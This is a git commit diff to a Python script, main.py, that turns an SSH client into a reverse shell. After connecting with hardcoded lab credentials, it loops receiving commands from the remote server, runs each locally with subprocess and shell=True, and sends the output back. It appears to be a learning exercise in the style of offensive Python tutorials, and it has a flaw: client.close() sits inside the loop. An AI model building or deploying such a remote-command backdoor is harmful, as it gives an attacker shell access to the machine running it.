4ab77f5612d11e83f0b3b4ddc86437b64a5b907d
dynamo2k1 <dynamo89247@email.com>
2025-02-15 12:54:15 -0500

    Update main code

--- main.py
+++ main.py
@@ -11,9 +11,17 @@ def ssh_command(ip,user,passwd, command):
     client.connect(ip,username=user,password=passwd)
     ssh_session = client.get_transport().open_session()
     if ssh_session.active:
-        ssh_session.exec_command(command)
+        ssh_session.send(command)
         print(ssh_session.recv(4096))
+        while True:
+            command = ssh_session.recv(4096)
+            try:
+                cmd_output = subprocess.check_output(command,shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
 
+            client.close()
     return
 
 ssh_command('192.168.100.134','dynamo','1590','id')
